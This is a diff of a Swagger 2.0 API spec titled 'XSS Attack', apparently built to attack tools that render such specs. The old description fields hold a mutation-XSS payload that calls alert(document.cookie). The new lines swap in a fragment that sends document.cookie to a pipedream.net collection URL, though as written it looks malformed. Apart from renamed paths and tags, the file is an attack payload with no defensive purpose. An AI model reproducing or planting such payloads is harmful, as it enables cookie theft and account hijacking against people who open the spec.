@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS Attack BY olive_cipher
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <path id="</textarea><https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,20 +14,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /olive_cipher:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - olive_cipher_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <path id="</textarea><https://eoakg9agm15930.m.pipedream.net?cookie=' + document.cookie>"></form>
           format: int64
           in: path
           name: id
